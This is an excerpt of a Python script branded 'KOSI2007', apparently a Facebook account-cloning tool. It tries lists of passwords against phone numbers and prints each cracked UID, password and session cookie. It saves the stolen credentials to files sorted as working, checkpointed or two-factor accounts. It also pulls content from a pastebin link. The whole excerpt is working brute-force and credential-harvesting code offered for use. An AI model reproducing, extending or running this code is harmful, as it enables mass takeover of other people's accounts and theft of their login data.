...
os.system('am start https://www.facebook.com/profile.php?id=100055279915184&mibextid=ZbWKwL')
...
def subc():
   ...
   ses=requests.get("https://pastebin.com/bYFkMLn9").text
...
def xyz():
    ...
    print('           \x1b[97m[\033[37;41m  K O S I 2 0 0 7   \033[0;m] ')
    print(f"")
...
def Tabii():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  K O S I 2 0 0 7   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mK O S I 2 0 0 7  :👇\033[0;m]")
    print(f"")
    ...
    print(f"          \x1b[97m[\033[37;41m  K O S I 2 0 0 7    \033[0;m]")
    print(f"")
    limit = int(input(' K O S I 2 0 0 7 : 1000, 2000, 5000, 10000\n\n PUT CLONING LIMIT: '))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[√]---------------------[KOSI2007-OK🤑]--------------------[√]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                cek_apk(session,coki)
                open('/sdcard/KOSI2007-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[KOSI2007-CP😭]---------------------[×]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/KOSI2007-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/KOSI2007-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[KOSI2007 ] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
